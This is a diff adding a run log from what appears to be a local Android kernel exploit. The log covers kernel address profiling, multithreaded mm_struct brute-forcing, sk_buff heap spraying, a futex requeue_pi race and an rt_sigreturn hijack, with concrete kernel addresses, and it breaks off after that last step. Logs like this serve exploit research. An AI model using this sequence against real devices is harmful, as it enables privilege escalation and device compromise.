@@ -1,0 +1,227 @@
+===== preload.so crash-safe log =====
+path=/storage/emulated/0/Download/.temp/log_1788945140.txt pid=9852 uid=2000
+1788945140.870 9852 [+] preload starting pid=9852
+1788945140.870 9852 [+] startup context pid=9852 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+1788945140.871 9852 [+] build config pid=9852 label=pd2238_os6_163150_w10 slide=pselect main=pselect
+1788945140.871 9852 [+] p0 profile pid=9852 phys_offset=0000000040000000 kernel_phys_load=0000000040000000 delta=0000000000000000 init_task=ffffffc00aaec240 root_tg=ffffffc00ad33100
+1788945140.872 9852 [+] direct-map base=ffffff8040000000 slide=0000000000000000
+1788945140.873 9852 [+] ckpt: WRITE-PROOF armed bootid_target=ffffff8002ee910d before=f2c10c54-0ff1-4225-9352-23a14501e182 (odd attempts: leaked page scratch, even attempts: this alias)
+1788945144.370 9852 [*] parameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+1788945146.551 9852 [*] pile-up verified: approx_time=1301
+1788945146.552 9852 [*] start finding collisisons
+1788945146.553 9852 [*] target    000000707b2ba0c8
+1788945147.042 9852 [*]   0000005ddc1f5fa8
+1788945148.674 9852 [*]   0000005ddcc793c8
+1788945151.050 9852 [*]   0000005dde0f77b8
+1788945155.696 9852 [*]   0000005de05d0e80
+1788945156.078 9852 [*]   0000005de08743a0
+1788945156.441 9852 [*]   0000005de0b188c0
+1788945157.141 9852 [*]   0000005de10c9648
+1788945157.589 9852 [*]   0000005de13cae50
+1788945160.461 9852 [*]   0000005de2c80400
+1788945162.199 9852 [*]   0000005de3c28140
+1788945162.632 9852 [*]   0000005de3e5e2f0
+1788945164.085 9852 [*]   0000005de4bf2f90
+1788945166.484 9852 [*]   0000005de6103818
+1788945167.035 9852 [*]   0000005de64341a0
+1788945167.460 9852 [*]   0000005de6686430
+1788945167.460 9852 [*] found 15 collisisons
+1788945168.570 9852 [*] start bruteforcing
+1788945168.575 9852 [*] [  0] start finding mm_struct [ffffff8000000000-ffffff8800000000]
+1788945168.576 9852 [*] [  2] start finding mm_struct [ffffff9000000000-ffffff9800000000]
+1788945168.575 9852 [*] [  1] start finding mm_struct [ffffff8800000000-ffffff9000000000]
+1788945168.577 9852 [*] [  4] start finding mm_struct [ffffffa000000000-ffffffa800000000]
+1788945168.577 9852 [*] [  3] start finding mm_struct [ffffff9800000000-ffffffa000000000]
+1788945168.577 9852 [*] [  7] start finding mm_struct [ffffffb800000000-ffffffc000000000]
+1788945168.577 9852 [*] [  6] start finding mm_struct [ffffffb000000000-ffffffb800000000]
+1788945168.579 9852 [*] [  0] tested 100000 candidates, scanning=0xffffff8005948f00
+1788945168.580 9852 [*] [  5] start finding mm_struct [ffffffa800000000-ffffffb000000000]
+1788945168.580 9852 [*] [  1] tested 100000 candidates, scanning=0xffffff8805948f00
+1788945168.585 9852 [*] [  0] tested 200000 candidates, scanning=0xffffff800b2921c0
+1788945168.586 9852 [*] [  1] tested 200000 candidates, scanning=0xffffff880b2921c0
+1788945168.589 9852 [*] [  0] tested 300000 candidates, scanning=0xffffff8010bdb480
+1788945168.580 9852 [*] [  2] tested 100000 candidates, scanning=0xffffff9005948f00
+1788945168.590 9852 [*] [  1] tested 300000 candidates, scanning=0xffffff8810bdb480
+1788945168.591 9852 [*] [  6] tested 100000 candidates, scanning=0xffffffb005948f00
+1788945168.583 9852 [*] [  4] tested 100000 candidates, scanning=0xffffffa005948f00
+1788945168.583 9852 [*] [  3] tested 100000 candidates, scanning=0xffffff9805948f00
+1788945168.587 9852 [*] [  5] tested 100000 candidates, scanning=0xffffffa805948f00
+1788945168.596 9852 [*] [  6] tested 200000 candidates, scanning=0xffffffb00b2921c0
+1788945168.591 9852 [*] [  0] tested 400000 candidates, scanning=0xffffff8016524740
+1788945168.593 9852 [*] [  2] tested 200000 candidates, scanning=0xffffff900b2921c0
+1788945168.595 9852 [*] [  3] tested 200000 candidates, scanning=0xffffff980b2921c0
+1788945168.597 9852 [*] [  7] tested 100000 candidates, scanning=0xffffffb805948f00
+1788945168.601 9852 [*] [  6] tested 300000 candidates, scanning=0xffffffb010bdb480
+1788945168.597 9852 [*] [  4] tested 200000 candidates, scanning=0xffffffa00b2921c0
+1788945168.598 9852 [*] [  1] tested 400000 candidates, scanning=0xffffff8816524740
+1788945168.598 9852 [*] [  5] tested 200000 candidates, scanning=0xffffffa80b2921c0
+1788945168.600 9852 [*] [  2] tested 300000 candidates, scanning=0xffffff9010bdb480
+1788945168.603 9852 [*] [  3] tested 300000 candidates, scanning=0xffffff9810bdb480
+1788945168.604 9852 [*] [  7] tested 200000 candidates, scanning=0xffffffb80b2921c0
+1788945168.605 9852 [*] [  0] tested 500000 candidates, scanning=0xffffff801be6da00
+1788945168.609 9852 [*] [  4] tested 300000 candidates, scanning=0xffffffa010bdb480
+1788945168.622 9852 [*] [  0] tested 600000 candidates, scanning=0xffffff80217b6cc0
+1788945168.623 9852 [*] [  4] tested 400000 candidates, scanning=0xffffffa016524740
+1788945168.609 9852 [*] [  6] tested 400000 candidates, scanning=0xffffffb016524740
+1788945168.610 9852 [*] [  5] tested 300000 candidates, scanning=0xffffffa810bdb480
+1788945168.613 9852 [*] [  2] tested 400000 candidates, scanning=0xffffff9016524740
+1788945168.616 9852 [*] [  1] tested 500000 candidates, scanning=0xffffff881be6da00
+1788945168.619 9852 [*] [  7] tested 300000 candidates, scanning=0xffffffb810bdb480
+1788945168.619 9852 [*] [  3] tested 400000 candidates, scanning=0xffffff9816524740
+1788945168.625 9852 [*] [  0] tested 700000 candidates, scanning=0xffffff80270fff80
+1788945168.627 9852 [*] [  4] tested 500000 candidates, scanning=0xffffffa01be6da00
+1788945168.628 9852 [*] [  6] tested 500000 candidates, scanning=0xffffffb01be6da00
+1788945168.631 9852 [*] [  5] tested 400000 candidates, scanning=0xffffffa816524740
+1788945168.634 9852 [*] [  2] tested 500000 candidates, scanning=0xffffff901be6da00
+1788945168.637 9852 [*] [  1] tested 600000 candidates, scanning=0xffffff88217b6cc0
+1788945168.640 9852 [*] [  7] tested 400000 candidates, scanning=0xffffffb816524740
+1788945168.643 9852 [*] [  3] tested 500000 candidates, scanning=0xffffff981be6da00
+1788945168.645 9852 [*] [  0] tested 800000 candidates, scanning=0xffffff802ca48f00
+1788945168.648 9852 [*] [  4] tested 600000 candidates, scanning=0xffffffa0217b6cc0
+1788945168.652 9852 [*] [  5] tested 500000 candidates, scanning=0xffffffa81be6da00
+1788945168.655 9852 [*] [  6] tested 600000 candidates, scanning=0xffffffb0217b6cc0
+1788945168.656 9852 [*] [  2] tested 600000 candidates, scanning=0xffffff90217b6cc0
+1788945168.657 9852 [*] [  1] tested 700000 candidates, scanning=0xffffff88270fff80
+1788945168.658 9852 [*] [  7] tested 500000 candidates, scanning=0xffffffb81be6da00
+1788945168.661 9852 [*] [  3] tested 600000 candidates, scanning=0xffffff98217b6cc0
+1788945168.662 9852 [*] [  4] tested 700000 candidates, scanning=0xffffffa0270fff80
+1788945168.662 9852 [*] [  0] tested 900000 candidates, scanning=0xffffff80323921c0
+1788945168.665 9852 [*] [  5] tested 600000 candidates, scanning=0xffffffa8217b6cc0
+1788945168.668 9852 [*] [  2] tested 700000 candidates, scanning=0xffffff90270fff80
+1788945168.668 9852 [*] [  6] tested 700000 candidates, scanning=0xffffffb0270fff80
+1788945168.668 9852 [*] [  1] tested 800000 candidates, scanning=0xffffff882ca48f00
+1788945168.671 9852 [*] [  3] tested 700000 candidates, scanning=0xffffff98270fff80
+1788945168.674 9852 [*] [  4] tested 800000 candidates, scanning=0xffffffa02ca48f00
+1788945168.676 9852 [*] [  7] tested 600000 candidates, scanning=0xffffffb8217b6cc0
+1788945168.676 9852 [*] [  0] tested 1000000 candidates, scanning=0xffffff8037cdb480
+1788945168.680 9852 [*] [  5] tested 700000 candidates, scanning=0xffffffa8270fff80
+1788945168.681 9852 [*] [  2] tested 800000 candidates, scanning=0xffffff902ca48f00
+1788945168.684 9852 [*] [  1] tested 900000 candidates, scanning=0xffffff88323921c0
+1788945168.685 9852 [*] [  6] tested 800000 candidates, scanning=0xffffffb02ca48f00
+1788945168.688 9852 [*] [  3] tested 800000 candidates, scanning=0xffffff982ca48f00
+1788945168.693 9852 [*] [  4] tested 900000 candidates, scanning=0xffffffa0323921c0
+1788945168.693 9852 [*] [  0] tested 1100000 candidates, scanning=0xffffff803d624740
+1788945168.695 9852 [*] [  7] tested 700000 candidates, scanning=0xffffffb8270fff80
+1788945168.713 9852 [*] [  0] tested 1200000 candidates, scanning=0xffffff8042f6da00
+1788945168.696 9852 [*] [  5] tested 800000 candidates, scanning=0xffffffa82ca48f00
+1788945168.697 9852 [*] [  2] tested 900000 candidates, scanning=0xffffff90323921c0
+1788945168.701 9852 [*] [  1] tested 1000000 candidates, scanning=0xffffff8837cdb480
+1788945168.704 9852 [*] [  6] tested 900000 candidates, scanning=0xffffffb0323921c0
+1788945168.706 9852 [*] [  3] tested 900000 candidates, scanning=0xffffff98323921c0
+1788945168.710 9852 [*] [  4] tested 1000000 candidates, scanning=0xffffffa037cdb480
+1788945168.725 9852 [*] [  7] tested 800000 candidates, scanning=0xffffffb82ca48f00
+1788945168.725 9852 [*] [  0] tested 1300000 candidates, scanning=0xffffff80488b6cc0
+1788945168.726 9852 [*] [  5] tested 900000 candidates, scanning=0xffffffa8323921c0
+1788945168.734 9852 [*] [  1] tested 1100000 candidates, scanning=0xffffff883d624740
+1788945168.736 9852 [*] [  2] tested 1000000 candidates, scanning=0xffffff9037cdb480
+1788945168.737 9852 [*] [  6] tested 1000000 candidates, scanning=0xffffffb037cdb480
+1788945168.738 9852 [*] [  3] tested 1000000 candidates, scanning=0xffffff9837cdb480
+1788945168.741 9852 [*] [  4] tested 1100000 candidates, scanning=0xffffffa03d624740
+1788945168.755 9852 [*] [  6] tested 1100000 candidates, scanning=0xffffffb03d624740
+1788945168.755 9852 [*] [  3] tested 1100000 candidates, scanning=0xffffff983d624740
+1788945168.743 9852 [*] [  7] tested 900000 candidates, scanning=0xffffffb8323921c0
+1788945168.747 9852 [*] [  0] tested 1400000 candidates, scanning=0xffffff804e1fff80
+1788945168.752 9852 [*] [  1] tested 1200000 candidates, scanning=0xffffff8842f6da00
+1788945168.752 9852 [*] [  2] tested 1100000 candidates, scanning=0xffffff903d624740
+1788945168.765 9852 [*] [  3] tested 1200000 candidates, scanning=0xffffff9842f6da00
+1788945168.752 9852 [*] [  5] tested 1000000 candidates, scanning=0xffffffa837cdb480
+1788945168.756 9852 [*] [  4] tested 1200000 candidates, scanning=0xffffffa042f6da00
+1788945168.770 9852 [*] [  5] tested 1100000 candidates, scanning=0xffffffa83d624740
+1788945168.760 9852 [*] [  6] tested 1200000 candidates, scanning=0xffffffb042f6da00
+1788945168.761 9852 [*] [  7] tested 1000000 candidates, scanning=0xffffffb837cdb480
+1788945168.793 9852 [*] [  6] tested 1300000 candidates, scanning=0xffffffb0488b6cc0
+1788945168.764 9852 [*] [  0] tested 1500000 candidates, scanning=0xffffff8053b48f00
+1788945168.767 9852 [*] [  1] tested 1300000 candidates, scanning=0xffffff88488b6cc0
+1788945168.767 9852 [*] [  2] tested 1200000 candidates, scanning=0xffffff9042f6da00
+1788945168.770 9852 [*] [  3] tested 1300000 candidates, scanning=0xffffff98488b6cc0
+1788945168.771 9852 [*] [  4] tested 1300000 candidates, scanning=0xffffffa0488b6cc0
+1788945168.773 9852 [*] [  5] tested 1200000 candidates, scanning=0xffffffa842f6da00
+1788945168.810 9852 [*] [  7] tested 1100000 candidates, scanning=0xffffffb83d624740
+1788945168.825 9852 [*] [  6] tested 1400000 candidates, scanning=0xffffffb04e1fff80
+1788945168.828 9852 [*] [  0] tested 1600000 candidates, scanning=0xffffff80594921c0
+1788945168.837 9852 [*] [  1] tested 1400000 candidates, scanning=0xffffff884e1fff80
+1788945168.840 9852 [*] [  2] tested 1300000 candidates, scanning=0xffffff90488b6cc0
+1788945168.843 9852 [*] [  3] tested 1400000 candidates, scanning=0xffffff984e1fff80
+1788945168.847 9852 [*] [  4] tested 1400000 candidates, scanning=0xffffffa04e1fff80
+1788945168.861 9852 [*] [  5] tested 1300000 candidates, scanning=0xffffffa8488b6cc0
+1788945168.862 9852 [*] [  7] tested 1200000 candidates, scanning=0xffffffb842f6da00
+1788945168.863 9852 [*] [  6] tested 1500000 candidates, scanning=0xffffffb053b48f00
+1788945168.865 9852 [*] [  0] tested 1700000 candidates, scanning=0xffffff805eddb480
+1788945168.865 9852 [*] [  1] tested 1500000 candidates, scanning=0xffffff8853b48f00
+1788945168.868 9852 [*] [  2] tested 1400000 candidates, scanning=0xffffff904e1fff80
+1788945168.871 9852 [*] [  3] tested 1500000 candidates, scanning=0xffffff9853b48f00
+1788945168.873 9852 [*] [  4] tested 1500000 candidates, scanning=0xffffffa053b48f00
+1788945168.875 9852 [*] [  5] tested 1400000 candidates, scanning=0xffffffa84e1fff80
+1788945168.878 9852 [*] [  6] tested 1600000 candidates, scanning=0xffffffb0594921c0
+1788945168.878 9852 [*] [  0] tested 1800000 candidates, scanning=0xffffff8064724740
+1788945168.880 9852 [*] [  7] tested 1300000 candidates, scanning=0xffffffb8488b6cc0
+1788945168.883 9852 [*] [  2] tested 1500000 candidates, scanning=0xffffff9053b48f00
+1788945168.883 9852 [*] [  3] tested 1600000 candidates, scanning=0xffffff98594921c0
+1788945168.883 9852 [*] [  1] tested 1600000 candidates, scanning=0xffffff88594921c0
+1788945168.886 9852 [*] [  4] tested 1600000 candidates, scanning=0xffffffa0594921c0
+1788945168.889 9852 [*] [  6] tested 1700000 candidates, scanning=0xffffffb05eddb480
+1788945168.892 9852 [*] [  0] tested 1900000 candidates, scanning=0xffffff806a06da00
+1788945168.896 9852 [*] [  7] tested 1400000 candidates, scanning=0xffffffb84e1fff80
+1788945168.923 9852 [*] [  7] tested 1500000 candidates, scanning=0xffffffb853b48f00
+1788945168.904 9852 [*] [  2] tested 1600000 candidates, scanning=0xffffff90594921c0
+1788945168.904 9852 [*] [  5] tested 1500000 candidates, scanning=0xffffffa853b48f00
+1788945168.908 9852 [*] [  3] tested 1700000 candidates, scanning=0xffffff985eddb480
+1788945168.908 9852 [*] [  1] tested 1700000 candidates, scanning=0xffffff885eddb480
+1788945168.913 9852 [*] [  4] tested 1700000 candidates, scanning=0xffffffa05eddb480
+1788945168.916 9852 [*] [  6] tested 1800000 candidates, scanning=0xffffffb064724740
+1788945168.919 9852 [*] [  0] tested 2000000 candidates, scanning=0xffffff806f9b6cc0
+1788945168.928 9852 [*] [  7] tested 1600000 candidates, scanning=0xffffffb8594921c0
+1788945168.932 9852 [*] [  2] tested 1700000 candidates, scanning=0xffffff905eddb480
+1788945168.936 9852 [*] [  5] tested 1600000 candidates, scanning=0xffffffa8594921c0
+1788945168.939 9852 [*] [  3] tested 1800000 candidates, scanning=0xffffff9864724740
+1788945168.941 9852 [*] [  1] tested 1800000 candidates, scanning=0xffffff8864724740
+1788945168.945 9852 [*] [  4] tested 1800000 candidates, scanning=0xffffffa064724740
+1788945168.948 9852 [*] [  6] tested 1900000 candidates, scanning=0xffffffb06a06da00
+1788945168.949 9852 [*] [  0] tested 2100000 candidates, scanning=0xffffff80752fff80
+1788945168.951 9852 [*] [  7] tested 1700000 candidates, scanning=0xffffffb85eddb480
+1788945168.954 9852 [*] [  2] tested 1800000 candidates, scanning=0xffffff9064724740
+1788945168.962 9852 [*] [  5] tested 1700000 candidates, scanning=0xffffffa85eddb480
+1788945168.964 9852 [*] [  3] tested 1900000 candidates, scanning=0xffffff986a06da00
+1788945168.968 9852 [*] [  4] tested 1900000 candidates, scanning=0xffffffa06a06da00
+1788945168.968 9852 [*] [  1] tested 1900000 candidates, scanning=0xffffff886a06da00
+1788945168.971 9852 [*] [  6] tested 2000000 candidates, scanning=0xffffffb06f9b6cc0
+1788945168.997 9852 [*] [  5] tested 1800000 candidates, scanning=0xffffffa864724740
+1788945168.990 9852 [*] [  0] tested 2200000 candidates, scanning=0xffffff807ac48f00
+1788945168.991 9852 [*] [  7] tested 1800000 candidates, scanning=0xffffffb864724740
+1788945168.994 9852 [*] [  4] tested 2000000 candidates, scanning=0xffffffa06f9b6cc0
+1788945168.995 9852 [*] [  1] tested 2000000 candidates, scanning=0xffffff886f9b6cc0
+1788945168.997 9852 [*] [  3] tested 2000000 candidates, scanning=0xffffff986f9b6cc0
+1788945168.999 9852 [*] [  6] tested 2100000 candidates, scanning=0xffffffb0752fff80
+1788945169.001 9852 [*] [  5] tested 1900000 candidates, scanning=0xffffffa86a06da00
+1788945169.002 9852 [*] [  0] tested 2300000 candidates, scanning=0xffffff80805921c0
+1788945169.002 9852 [*] [  7] tested 1900000 candidates, scanning=0xffffffb86a06da00
+1788945169.004 9852 [*] [  2] tested 1900000 candidates, scanning=0xffffff906a06da00
+1788945169.019 9852 [*] [  7] thread done, tested 1900000 candidates
+1788945169.005 9852 [*] [  4] tested 2100000 candidates, scanning=0xffffffa0752fff80
+1788945169.013 9852 [*] [  1] tested 2100000 candidates, scanning=0xffffff88752fff80
+1788945169.020 9852 [*] [  4] thread done, tested 2100000 candidates
+1788945169.016 9852 [*] [  3] tested 2100000 candidates, scanning=0xffffff98752fff80
+1788945169.021 9852 [*] [  1] thread done, tested 2100000 candidates
+1788945169.017 9852 [*] [  6] tested 2200000 candidates, scanning=0xffffffb07ac48f00
+1788945169.018 9852 [*] [  5] thread done, tested 1970035 candidates
+1788945169.022 9852 [*] [  3] thread done, tested 2100000 candidates
+1788945169.018 9852 [*] [  0] thread done, tested 2339687 candidates
+1788945169.019 9852 [*] [  2] thread done, tested 1900000 candidates
+1788945169.022 9852 [*] [  6] thread done, tested 2200000 candidates
+1788945169.023 9852 [*] prepare_kernel_page leaked_mm=ffffff8082901a40 base=ffffff8082900000 mode=0
+1788945169.024 9852 [*] fake payload mode=0 write_shape=0 lock=ffffff80829004d0 w0=ffffff80829013a0 task=ffffff8082902380 write_parent=ffffff8082900180 write_right=0000000000000000 write_left=ffffff8082902180
+1788945169.029 9852 [*] sk_buff reclaim send 1/4 ret=65536 errno=0
+1788945169.030 9852 [*] sk_buff reclaim send 2/4 ret=65536 errno=0
+1788945169.031 9852 [*] sk_buff reclaim send 3/4 ret=65536 errno=0
+1788945169.032 9852 [*] sk_buff reclaim send 4/4 ret=65536 errno=0
+1788945169.033 9852 [*] done
+1788945172.138 9852 [+] heap_spray: page_base=ffffff8082900000 (leaked mm_struct)
+1788945172.138 9852 [+] ckpt: route enter
+1788945172.139 9852 [+] ckpt: route threads spawned
+1788945172.151 9852 [+] ckpt: route ready waiter_waiting=1 owner_started=1
+1788945172.252 9852 [+] ckpt: route CMP_REQUEUE_PI ret=-1 errno=35
+1788945180.150 9852 [+] ckpt: waiter WAIT_REQUEUE_PI ret=-1 errno=110 tid=19544 sigalrm=0 setprio=0/0
+1788945180.153 9852 [+] ckpt: do_sigret enter page=ffffff8082900000 lock=ffffff80829004d0 fops=ffffff8082900180
+1788945180.155 9852 [+] ckpt: sigret attempt=1 page=ffffff8082900000 lock=ffffff80829004d0 tree_pc=ffffff8082900180 tree_left=ffffff8082902180 task=ffffff8042aec240
+1788945180.156 9852 [+] ckpt: prctl tree-paint ret=-1 errno=22 (EINVAL after copy is OK)
+1788945180.157 9852 [+] ckpt: firing rt_sigreturn pc=0x707a139cf8 sp=0000007070255a60
